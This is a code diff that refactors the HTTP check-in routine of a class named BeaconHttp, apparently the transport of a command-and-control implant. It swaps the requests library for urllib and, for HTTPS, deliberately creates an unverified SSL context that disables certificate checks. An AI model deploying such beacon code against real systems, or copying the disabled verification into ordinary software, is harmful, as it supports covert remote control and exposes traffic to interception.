@@ -3,10 +3,9 @@ import time
 import json
 import random
 
-import requests
-
-import urllib3
-urllib3.disable_warnings()
+import ssl
+import urllib.error
+import urllib.request
 
 from Beacon import Beacon
 
@@ -122,23 +121,28 @@ class BeaconHttp(Beacon):
 
         url = f"{self.scheme}://{self.url}:{self.port}{endpoint}"
 
-        verify = False if self.isHttps else True
+        data = payload.encode("utf-8")
+
+        request = urllib.request.Request(
+            url,
+            data=data,
+            headers=self._headers,
+            method="POST",
+        )
+
+        context = None
+        if self.isHttps:
+            context = ssl._create_unverified_context()
 
         try:
-            response = requests.post(
-                url,
-                data=payload.encode("utf-8"),
-                headers=self._headers,
-                verify=verify,
-                timeout=15,
-            )
-        except requests.RequestException:
+            with urllib.request.urlopen(request, timeout=15, context=context) as response:
+                status_code = response.getcode()
+                body = response.read().decode("utf-8", errors="ignore").strip()
+        except (urllib.error.URLError, urllib.error.HTTPError):
             return
 
-        if response.status_code != 200:
+        if status_code != 200:
             return
-
-        body = response.content.decode("utf-8", errors="ignore").strip()
         if not body:
             return
 
